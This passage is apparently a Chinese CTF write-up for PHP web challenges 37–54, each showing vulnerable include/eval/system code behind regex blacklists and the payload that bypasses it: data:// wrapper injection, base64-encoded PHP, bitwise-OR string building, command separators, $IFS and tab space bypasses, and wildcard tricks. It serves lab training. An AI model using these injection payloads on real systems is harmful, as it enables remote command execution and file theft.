<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&quot;cat fl*&quot;) <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>查看源码即可得到flag</p>
<h2 id="web-38"><a href="#web-38" class="headerlink" title="web 38"></a>web 38</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解法一：</p>
<p>原理同上一题，多了个php过滤，base64编码绕过即可</p>
<p>payload：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="regexp">//</span>text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTs=</span><br></pre></td></tr></table></figure>
<h2 id="web-39"><a href="#web-39" class="headerlink" title="web 39"></a>web 39</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同37</p>
<h2 id="web-40"><a href="#web-40" class="headerlink" title="web 40"></a>web 40</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了引号、美元符号、冒号，这里可以构造无参数函数进行文件读取</p>
<p><a href="https://www.cnblogs.com/NPFS/p/13778333.html" target="_blank">无参数文件读取</a></p>
<p>看来上面这篇文章应该可以知道scandir(current(localeconv())) 查看当前目录所有文件名</p>
<p>我们可以发现flag.php在数组的倒数第二个值里，我们可以通过 array_reverse 进行逆转数组，然后用next()函数进行下一个值的读取，记得成功读取flag.php文件</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">payload:?c=<span class="built_in">highlight_flie</span>(<span class="built_in">next</span>(<span class="built_in">array_reverse</span>(<span class="built_in">scandir</span>(<span class="built_in">current</span>(<span class="built_in">localeconv</span>())))));</span><br></pre></td></tr></table></figure>
<h2 id="web-41"><a href="#web-41" class="headerlink" title="web 41"></a>web 41</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>过滤数字、字母、^、+、~、$、[、]、{、}、&amp;、-【不区分大小写】</li>
<li><code>&amp;</code> 按位与 <code>|</code>按位或 <code>^</code> 按位异或 <code>~</code>取反 为四大位运算符，其中按位异<code>|</code>没有过滤，过滤的字符是防异或、自增和取反构造字符</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">$length = strlen($payload);</span><br><span class="line">$a = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$flag = <span class="number">0</span>;</span><br><span class="line">echo <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> ($l = <span class="number">0</span>; $l &lt; $length; $l++) &#123;</span><br><span class="line">    $flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>,<span class="built_in">chr</span>($i))) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> ($j = <span class="number">1</span>; $j &lt; <span class="number">256</span>; $j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>,<span class="built_in">chr</span>($j))) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">chr</span>($i) | <span class="built_in">chr</span>($j)) === $payload[$l]) &#123;</span><br><span class="line">                echo urlencode(<span class="built_in">chr</span>($i));</span><br><span class="line">                $a=$a.urlencode(<span class="built_in">chr</span>($i));</span><br><span class="line">                echo <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">                echo urlencode(<span class="built_in">chr</span>($j));</span><br><span class="line">                $b=$b.urlencode(<span class="built_in">chr</span>($j));</span><br><span class="line">                echo <span class="string">&#x27;=&#x27;</span> . $payload[$l];</span><br><span class="line">                echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                $flag=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($flag===<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $a.<span class="string">&#x27;|&#x27;</span>.$b;</span><br></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">c</span>=&#x27;&#x27;);(&#x27;%<span class="number">13</span>%<span class="number">19</span>%<span class="number">13</span>%<span class="number">14</span>%<span class="number">05</span>%<span class="number">0</span>D&#x27;|&#x27;%<span class="number">60</span>%<span class="number">60</span>%<span class="number">60</span>%<span class="number">60</span>%<span class="number">60</span>%<span class="number">60</span>&#x27;)((&#x27;%<span class="number">03</span>%<span class="number">01</span>%<span class="number">14</span>&#x27;|&#x27;%<span class="number">60</span>%<span class="number">60</span>%<span class="number">60</span>&#x27;).&#x27; &#x27;.(&#x27;%<span class="number">06</span>%<span class="number">0</span>C%<span class="number">01</span>%<span class="number">07</span>%<span class="number">02</span>%<span class="number">10</span>%<span class="number">08</span>%<span class="number">10</span>&#x27;|&#x27;%<span class="number">60</span>%<span class="number">60</span>%<span class="number">60</span>%<span class="number">60</span>%<span class="number">2</span>C%<span class="number">60</span>%<span class="number">60</span>%<span class="number">60</span>&#x27;));//</span><br><span class="line"><span class="attribute">c</span>=&#x27;&#x27;);system(<span class="string">&quot;cat flag.php&quot;</span>);//</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="http://img.npfs06.top/20210223163735.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web-42"><a href="#web-42" class="headerlink" title="web 42"></a>web 42</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>&gt;/dev/null 2&gt;&amp;1</strong>主要意思是不进行回显的意思，可参考<a href="https://www.cnblogs.com/tinywan/p/6025468.html" target="_blank">https://www.cnblogs.com/tinywan/p/6025468.html</a></p>
<p>我们要让命令回显，那么进行命令分隔即可</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">;	<span class="regexp">//</span>分号</span><br><span class="line">|	<span class="regexp">//</span>只执行后面那条命令</span><br><span class="line">||	<span class="regexp">//</span>只执行前面那条命令</span><br><span class="line">&amp;	<span class="regexp">//</span>两条命令都会执行</span><br><span class="line">&amp;&amp;	<span class="regexp">//</span>两条命令都会执行</span><br></pre></td></tr></table></figure>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">payload：<span class="built_in">cat</span> flag.php;</span><br><span class="line">payload:   <span class="built_in">cat</span> flag.php||</span><br></pre></td></tr></table></figure>
<h2 id="web-43"><a href="#web-43" class="headerlink" title="web 43"></a>web 43</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了cat和分号,换一个文件读取命令即可，<a href="https://www.cnblogs.com/NPFS/p/13279815.html" target="_blank">命令执行绕过小技巧</a></p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">more:</span>一页一页的显示档案内容</span><br><span class="line"><span class="symbol">less:</span>与 more 类似</span><br><span class="line"><span class="symbol">head:</span>查看头几行</span><br><span class="line"><span class="symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"><span class="symbol">tail:</span>查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line"><span class="symbol">od:</span>以二进制的方式读取档案内容</span><br><span class="line"><span class="symbol">vi:</span>一种编辑器，这个也可以查看</span><br><span class="line"><span class="symbol">vim:</span>一种编辑器，这个也可以查看</span><br><span class="line"><span class="symbol">sort:</span>可以查看</span><br><span class="line"><span class="symbol">uniq:</span>可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">grep</span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">payload: <span class="built_in">sort</span> <span class="built_in">flag</span>.php||      （payload有很多，这里只列举一个）</span><br></pre></td></tr></table></figure>
<p>查看源码即可得到flag</p>
<h2 id="web-44"><a href="#web-44" class="headerlink" title="web 44"></a>web 44</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>多过滤了一个flag,通配符绕过即可</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">payload:</span>?<span class="keyword">c</span><span class="operator">=</span>sort<span class="variable">%20</span>fl*||      (payload有很多，这里只列举一个）</span><br></pre></td></tr></table></figure>
<h2 id="web-45"><a href="#web-45" class="headerlink" title="web 45"></a>web 45</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>多过滤了个空格</p>
<p><strong>空格绕过</strong></p>
 <figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` 重定向符</span><br><span class="line">`%<span class="number">09</span>`(需要php环境)</span><br><span class="line">`$&#123;IFS&#125;`</span><br><span class="line">`$IFS$<span class="number">9</span>`</span><br><span class="line">`&#123;cat,flag.php&#125;` //用逗号实现了空格功能</span><br><span class="line">`%<span class="number">20</span>`</span><br><span class="line">`%<span class="number">09</span></span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">payload： ?c=<span class="built_in">sort</span><span class="variable">$</span>&#123;IFS&#125;<span class="built_in">fl</span>*|| </span><br></pre></td></tr></table></figure>

<h2 id="web-46"><a href="#web-46" class="headerlink" title="web 46"></a>web 46</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了数子，$，*等，通配符可以使用？问号，空格可用%09  （不属于数字）</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">payload:</span> ?<span class="keyword">c</span><span class="operator">=</span>sort<span class="variable">%09</span>fl?g.php||</span><br></pre></td></tr></table></figure>

<h2 id="web-47"><a href="#web-47" class="headerlink" title="web 47"></a>web 47</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>多过滤了一些内容，自己按照表找出未被过滤的进行替代即可</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">payload:</span> ?<span class="keyword">c</span><span class="operator">=</span>tac<span class="variable">%09</span>fl?g.php||</span><br></pre></td></tr></table></figure>
<h2 id="web-48"><a href="#web-48" class="headerlink" title="web 48"></a>web 48</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同上</p>
<h2 id="web-49"><a href="#web-49" class="headerlink" title="web 49"></a>web 49</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同上</p>
<h2 id="web-50"><a href="#web-50" class="headerlink" title="web 50"></a>web 50</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>&lt;&gt;和?一起使用时没有回显,所以这里的？可以用反斜杠进行代替</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">paylaod:</span>?c=tac<span class="params">&lt;&gt;</span>fla\g.php||</span><br></pre></td></tr></table></figure>

<h2 id="web-51"><a href="#web-51" class="headerlink" title="web 51"></a>web 51</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>%0a是换行，同样可以进行命令分隔；tac被过滤，换nl</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">payload:</span> ?c=nl<span class="params">&lt;&gt;</span>fla\g.php%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

<h2 id="web-52"><a href="#web-52" class="headerlink" title="web 52"></a>web 52</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?c</span>=nl<span class="variable">$&#123;</span>IFS&#125;fla\g.php%0a</span><br></pre></td></tr></table></figure>
<p>得到</p>
<p><img src="http://img.npfs06.top/20210225161238.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>emmmm 假的</p>
<p>看下根目录</p>
<p><img src="http://img.npfs06.top/20210225161250.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>读取即可</p>
<p><img src="http://img.npfs06.top/20210225161306.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web-53"><a href="#web-53" class="headerlink" title="web 53"></a>web 53</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>更简单了，不需要命令分隔了……</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">payload:</span><span class="string">?c</span>=nl<span class="variable">$&#123;</span>IFS&#125;fla\g.php</span><br></pre></td></tr></table></figure>

<h2 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c&#x3D;$_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>grep</strong></p>
